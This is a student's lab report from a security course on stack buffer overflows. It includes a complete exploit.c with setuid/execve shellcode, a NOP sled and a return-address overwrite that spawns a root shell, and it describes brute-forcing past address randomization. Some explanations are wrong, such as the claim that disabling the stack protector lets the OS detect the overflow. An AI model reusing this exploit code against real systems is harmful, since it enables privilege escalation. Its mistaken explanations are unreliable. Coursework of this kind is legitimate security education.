# Lab 7 - Playing with Buffer Overflow

### Team Members:
1. Adam Robertson, abt5598@psu.edu, 938152440

## Drills
There are five tasks for you to complete. Please give a brief summary of what you did – feel free to include any thoughts / concerns / problems / etc. you encountered during the tasks. Also, include your answers to the questions asked in each task. Save your report as a PDF and submit it to Canvas before the deadline.



## Task 1

### Task 1: Summary

We must turn address randomization off before starting.

 First we need to find where the return address is stored so we can overwrite with the buffer. We find that it is at 0xbfffed5c (pic 1). We can see that the buffer is at 0xbfffed44 which is 0x18 from the return address. So we write at the start byte located 0x18 from buffer.

Next, we determine where we want to jump. Since we don't know what kind of enviroment variables might be declared that would shift the virtual address space, we can't hardcode to the exact location of our shellcode. However, we can guess that the enviromnent variables will take up similar amounts of space between sessions, so we can use a NOP sled to slide into our shell code. As long as we jump to some NOP instruction, we will be able to run our shell code.

So for our badfile, we write our shell code at the end of the 517 byte buffer. This gives us a NOP sled size of 463 bytes. Halfway would be 232 bytes. So we want to try and jump to &buffer + 0x18 + 232. We store this address in the return address. (Which is 0x18 from buffer) This should give us a good chance of landing in the NOP zone given that the enviroment variables take up a similar memory footprint.
>

### Task 1: Question Answers

> 1. Include the screenshots of main steps.
> 
> Figuring out addresses:
> ![](addresses.png)
>
> Resulting exploit:
> ![](exploitCode.png)
>
> Task 1:
> 
> ![](task1Fin.png)
> 
> 2. Include the completed `exploit.c`.
> ``` c
>/* exploit.c */
>/* A program that creates a file containing code for >launching shell*/
>#include <stdlib.h>
>#include <stdio.h>
>#include <string.h>
>char shellcode[]=
>   // setuid(0)
>   "\x31\xdb" /* xor %ebx,%ebx */
>   "\x6a\x17" /* push $0x17 */
>   "\x58" /* pop %eax */
>   "\xcd\x80" /* int $0x80 */
>   // execve("/bin//sh", ...)
>   "\x31\xc0" /* xorl %eax,%eax */
>   "\x50" /* pushl %eax */
>   "\x68""//sh" /* pushl $0x68732f2f */
>   "\x68""/bin" /* pushl $0x6e69622f */
>   "\x89\xe3" /* movl %esp,%ebx */
>   "\x50" /* pushl %eax */
>   "\x53" /* pushl %ebx */
>   "\x89\xe1" /* movl %esp,%ecx */
>   "\x99" /* cdql */
>   "\xb0\x0b" /* movb $0x0b,%al */
>   "\xcd\x80" /* int $0x80 */
>   ;
>void main(int argc, char **argv)
>{
>   char buffer[517];
>   FILE *badfile;
>   /* Initialize buffer with 0x90 (NOP instruction) */
>   memset(&buffer, 0x90, 517);
>   
>   /* You need to fill the buffer with appropriate contents > here */;
>   int progAddress = 0xbfffed5c + ((517-35) / 2);
>   memcpy(buffer + 0x18, &progAddress, 4);
>   memcpy(buffer + (517 - 33), shellcode, 32);
>   
>   /* Save the contents to the file "badfile" */
>   badfile = fopen("./badfile", "w");
>   fwrite(buffer, 517, 1, badfile);
>   fclose(badfile);
>}
> ```




## Task 2

### Task 2: Summary

Next we turn address randomization back on to see if the shellcode still works.

### Task 2: Question Answers

> 1. Include the screenshots.
> 
> Task2:
> 
> ![](task2Fin.png)
> 
> 2. Please describe your observation and explanation.
> 
> When we turn on randomization, the chances of jumping into our NOP sled are much lower. So we run the program in a loop until we land in the NOP zone. Whenever it fails, it seg faults and then tries again.


## Task 3

### Task 3: Summary

By disabling the stack protector, the operating system should be able to tell when we overwrite the return address.

### Task 3: Question Answers

> 1. Include the screenshots.
>
> Task3:
> 
> ![](task3Fin.png)
>
> 2. Please report your observation.
>
> For task 3 and 4, I assume they are not supposed to work, but even after deleting my previous executable and restarting, I continue to get a shell.



## Task 4

### Task 4: Summary

We can disable the ability to execute code in the stack. This means the shell code we overflowed our buffer with will not run.

### Task 4: Question Answers

> 1. Include the screenshots.
> Task4:
> 
> ![](task4Fin.png)
> 
> 2. Please describe your observation and explanation.
> 
> For task 3 and 4, I assume they are not supposed to work, but even after deleting my previous executable and restarting, I continue to get a shell.